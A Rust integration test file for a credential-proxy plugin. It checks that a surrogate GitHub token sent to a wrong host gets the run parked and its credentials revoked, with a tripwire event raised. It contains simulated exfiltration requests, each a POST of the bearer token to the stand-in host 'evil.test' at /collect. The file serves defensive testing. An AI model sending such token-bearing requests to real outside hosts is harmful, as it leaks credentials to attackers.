//! ADR 0150 §6.2 in the installed plugin: a surrogate sent to a host that is
//! not its provider's parks the run and revokes what it was issued, at once.
//! The run keeps its listener, so the next use of the same surrogate — even a
//! correct one, to its own provider — is refused as `surrogate.revoked`, and
//! the parent hears the tripwire on the plugin's stdout.

mod plugin_support;

use std::time::Duration;

use plugin_support::{through_proxy, wait_for, Install};

fn bearer(host: &str, path: &str, method: &str, surrogate: &str) -> String {
    format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nAuthorization: Bearer {surrogate}\r\n\
         Content-Length: 0\r\nConnection: close\r\n\r\n"
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn a_misdirected_surrogate_revokes_the_run_so_even_a_correct_use_is_refused() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&install.spec("dev-run-t1", 60));
    let reply = plugin.reply();
    let surrogate = reply["env"]["GITHUB_TOKEN"].as_str().unwrap().to_owned();

    let (status, _) = through_proxy(
        &reply,
        "evil.test",
        &bearer("evil.test", "/collect", "POST", &surrogate),
    )
    .await
    .expect("the proxy terminates the exfiltration host");
    assert_eq!(status, 403);

    // The parent is told on the control pipe: the fence, the verdict, and
    // how many credentials went — never the surrogate.
    let event = plugin.reply();
    assert_eq!(event["event"], "tripwire", "{event}");
    assert_eq!(event["fence"], "surrogate.misdirected");
    assert_eq!(event["verdict"], "park");
    assert!(event["revoked"].as_u64().unwrap() >= 1, "{event}");
    assert!(!event.to_string().contains(&surrogate));

    // The same surrogate, now sent exactly where it belongs, redeems nothing.
    let (status, body) = through_proxy(
        &reply,
        "api.github.com",
        &bearer("api.github.com", "/user", "GET", &surrogate),
    )
    .await
    .expect("the listener still serves the run, so a late use is seen");
    assert_eq!(status, 403, "{body}");
    assert!(!body.contains(&surrogate));

    let notices = wait_for(&install.notices(), "surrogate.revoked");
    assert!(notices.contains("surrogate.misdirected"), "{notices}");
    assert!(notices.contains("surrogate.revoked"), "{notices}");
    assert!(!notices.to_ascii_lowercase().contains("osr_"), "{notices}");

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_run_the_parent_does_not_watch_is_reported_but_not_revoked() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    let mut spec = install.spec("dev-run-t2", 60);
    spec["watched"] = serde_json::json!(false);
    plugin.send(&spec);
    let reply = plugin.reply();
    let surrogate = reply["env"]["GITHUB_TOKEN"].as_str().unwrap().to_owned();
    let (status, _) = through_proxy(
        &reply,
        "evil.test",
        &bearer("evil.test", "/collect", "POST", &surrogate),
    )
    .await
    .unwrap();
    assert_eq!(status, 403);
    let notices = wait_for(&install.notices(), "surrogate.misdirected");
    assert!(notices.contains("surrogate.misdirected"), "{notices}");
    // No tripwire line: the run's owner policy, not the rule, decides.
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
    assert_eq!(plugin.rest(), "");
}
